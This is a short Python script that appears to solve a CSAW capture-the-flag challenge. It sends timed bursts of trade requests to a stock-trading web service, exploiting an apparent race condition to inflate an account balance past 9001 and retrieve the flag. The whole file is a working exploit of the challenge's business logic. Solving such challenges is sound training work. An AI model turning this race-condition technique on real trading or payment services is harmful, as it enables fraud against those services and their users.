import requests
import time
import uuid

def main():
    base_url = "http://android-dropper.csaw.io:4657"
    key = str(uuid.uuid4())
    print(f"Using key: {key}")

    def get_balance():
        try:
            r = requests.post(f"{base_url}/login", data={"key": key})
            return float(r.json()["balance"])
        except:
            return 0.0

    # Buy initial stock
    r = requests.post(f"{base_url}/buy", data={"key": key, "stock": "BROOKING"})
    print(f"Initial buy result: {r.text}")
    time.sleep(0.5)

    initial_balance = get_balance()
    print(f"Balance after buying BROOKING: ${initial_balance}")

    # Function to send trade request
    def send_trade():
        try:
            return requests.post(f"{base_url}/trade", data={
                "key": key,
                "stock": "BROOKING",
                "stock1": "BURPSHARKHAT"
            })
        except Exception as e:
            print(f"Error sending trade: {e}")
            return None

    # Try to hit the exact timing window
    for attempt in range(50):
        print(f"\nAttempt {attempt + 1}")

        # Send 12 trades with precise timing
        for i in range(12):
            r = send_trade()
            if r:
                print(f"Trade {i+1} response: {r.text}")
            time.sleep(0.08)  # 80ms between trades

        balance = get_balance()
        print(f"Current balance: ${balance}")

        if balance > 9001:
            print("Success! Getting flag...")
            r = requests.post(f"{base_url}/flag", data={"key": key})
            print(f"Flag response: {r.text}")
            if "csawctf{" in r.text:
                break

        # Wait for throttle reset
        time.sleep(10.1)  # Just over 10 seconds

if __name__ == "__main__":
    main()

